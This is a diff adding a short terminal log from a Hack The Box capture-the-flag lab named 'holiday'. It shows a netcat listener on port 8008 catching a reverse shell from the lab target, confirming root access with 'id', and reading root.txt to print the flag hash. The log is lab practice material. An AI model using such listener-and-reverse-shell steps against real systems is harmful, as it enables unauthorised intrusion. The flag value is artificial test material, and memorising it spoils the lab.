@@ -1,0 +1,18 @@
+root@parrot:~/hackthebox/holiday# nc -nvlp 8008                             
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                
+Ncat: Listening on :::8008              
+Ncat: Listening on 0.0.0.0:8008         
+Ncat: Connection from 10.10.10.25.    
+Ncat: Connection from 10.10.10.25:37194.                                    
+# id               
+uid=0(root) gid=0(root) groups=0(root)                                      
+# ls               
+index.js           
+package.json       
+# cd /root         
+# ls               
+root.txt           
+# cat root.txt     
+a844cb50bf88ebbe8412e095a6b642e8      
+# exit             
+root@parrot:~/hackthebox/holiday#     
